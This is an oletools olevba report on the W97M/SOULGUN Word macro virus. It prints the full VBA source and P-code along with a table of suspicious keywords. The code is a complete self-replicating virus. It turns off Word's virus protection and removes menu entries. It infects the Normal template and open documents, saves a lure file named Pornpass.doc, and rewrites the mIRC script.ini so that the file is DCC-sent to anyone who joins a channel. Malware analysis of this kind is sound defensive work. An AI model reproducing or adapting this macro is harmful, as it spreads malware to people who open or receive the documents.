olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.dm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.dm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
' Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM
On Error Resume Next
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With

CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
Application.ScreenUpdating = False
Options.SendMailAttach = True

nomcnt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
actcnt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If nomcnt >= 12 Then nominf = True Else nominf = False
If actcnt >= 12 Then actinf = True Else actinf = False

ActiveDocument.VBProject.VBComponents.Item(1).Name = NormalTemplate.VBProject.VBComponents.Item(1).Name

If actinf = True Then ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\chile.sys"
If nominf = False Then Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If actinf = False Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
If nominf = False And System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed" Then
MsgBox "sOUlGun has returned"
MsgBox "As far from god as heaven is wide As far from god as angels can fly", vbExclamation, "W97M/SOULGUN"
Application.Quit

If (Day(Now)) = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Reprieved"
End If

If nominf = False Then System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed"
host.codemodule.AddFromFile ("c:\chile.sys")

With host.codemodule
For x = 1 To 4
.deletelines 1
Next x
End With

If nominf = False Then host.codemodule.ReplaceLine 1, "Sub AutoClose()"
If actinf = False Then host.codemodule.ReplaceLine 1, "Sub AutoOpen()"
If actinf = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
If nominf = False Then NormalTemplate.Save
If nominf = False And System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed" Then

ActiveDocument.SaveAs FileName:="c:\Pornpass.doc", fileformat:=wdFormatDocument, AddToRecentFiles:=False, ReadOnlyRecommended:=False
On Error GoTo mircnothere
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\Pornpass.doc }"
Print #1, "n1=on 1:CONNECT: {"
Print #1, "n2=  /join #vir"
Print #1, "n3=  /msg #vir As far from g0d as angels can fly....Another W97m/Soulgun Infected user"
Close 1
End If
mircnothere:
With host.codemodule
For x = 2 To 8
.ReplaceLine x, "' " & Application.UserInitials & Application.StartupPath & Now & Application.WindowState & Now
Next x
End With
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.dm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6330 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #2:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #3:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #4:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #5:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #6:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #7:
' 	QuoteRem 0x0000 0x0057 " Tc:\program files\microsoft office\office\startup2/23/01 8:29:49 PM12/23/01 8:29:49 PM"
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #13:
' 	EndWith 
' Line #14:
' Line #15:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #16:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #17:
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #20:
' Line #21:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nomcnt 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St actcnt 
' Line #23:
' Line #24:
' 	Ld nomcnt 
' 	LitDI2 0x000C 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St nominf 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St nominf 
' 	EndIf 
' Line #25:
' 	Ld actcnt 
' 	LitDI2 0x000C 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St actinf 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St actinf 
' 	EndIf 
' Line #26:
' Line #27:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #28:
' Line #29:
' 	Ld actinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\chile.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	EndIf 
' Line #30:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #31:
' 	Ld actinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #32:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main"
' 	LitStr 0x0007 "SoulGun"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Installed"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitStr 0x0014 "sOUlGun has returned"
' 	ArgsCall MsgBox 0x0001 
' Line #34:
' 	LitStr 0x0043 "As far from god as heaven is wide As far from god as angels can fly"
' 	Ld vbExclamation 
' 	LitStr 0x000C "W97M/SOULGUN"
' 	ArgsCall MsgBox 0x0003 
' Line #35:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #36:
' Line #37:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Paren 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "Reprieved"
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main"
' 	LitStr 0x0007 "SoulGun"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "Installed"
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main"
' 	LitStr 0x0007 "SoulGun"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #41:
' 	LitStr 0x000C "c:\chile.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #42:
' Line #43:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #45:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	EndWith 
' Line #48:
' Line #49:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #50:
' 	Ld actinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #51:
' 	Ld actinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #52:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #53:
' 	Ld nominf 
' 	LitVarSpecial (False)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main"
' 	LitStr 0x0007 "SoulGun"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Installed"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #54:
' Line #55:
' 	LitStr 0x000F "c:\Pornpass.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #56:
' 	OnError mircnothere 
' Line #57:
' 	LitStr 0x0012 "c:\mirc\script.ini"
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	LitStr 0x0012 "c:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\Pornpass.doc }"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "n1=on 1:CONNECT: {"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n2=  /join #vir"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0056 "n3=  /msg #vir As far from g0d as angels can fly....Another W97m/Soulgun Infected user"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Label mircnothere 
' Line #67:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #68:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	For 
' Line #69:
' 	Ld x 
' 	LitStr 0x0002 "' "
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd WindowState 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #70:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	EndWith 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

